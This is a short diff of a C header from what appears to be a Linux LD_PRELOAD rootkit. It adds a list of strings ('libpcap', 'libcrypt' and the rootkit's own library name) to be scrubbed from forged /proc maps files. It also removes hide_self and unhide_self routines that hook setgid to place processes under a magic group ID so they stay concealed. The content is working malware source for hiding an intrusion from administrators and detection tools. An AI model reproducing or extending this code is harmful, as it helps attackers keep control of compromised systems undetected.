@@ -5,6 +5,10 @@
 #endif
 
 #ifdef FORGE_MAPS
+// lines containing these vvv are redacted. this should be ok the way it is.
+// but if not..u know whatta do
+static char* const bads[3] = {BDVLSO, "libpcap", "libcrypt"};
+char *badstring(char *buf);
 FILE *forge_maps(const char *pathname);
 FILE *forge_smaps(const char *pathname);
 FILE *forge_numamaps(const char *pathname);
@@ -18,28 +22,3 @@ int hideport_alive(void);
 FILE *forge_procnet(const char *pathname);
 #include "procnetforge.c"
 #endif
-
-
-void _setgid(gid_t gid){
-    hook(CSETGID);
-    call(CSETGID, gid);
-}
-
-void hide_self(void){
-#ifndef HIDE_SELF
-    return;
-#endif
-
-    gid_t magicgid = readgid();
-    if(notuser(0) || getgid() == magicgid) return;
-    _setgid(magicgid);
-}
-
-void unhide_self(void){
-#ifndef HIDE_SELF
-    return;
-#endif
-
-    if(notuser(0) || getgid() == 0) return;
-    _setgid(0);
-}
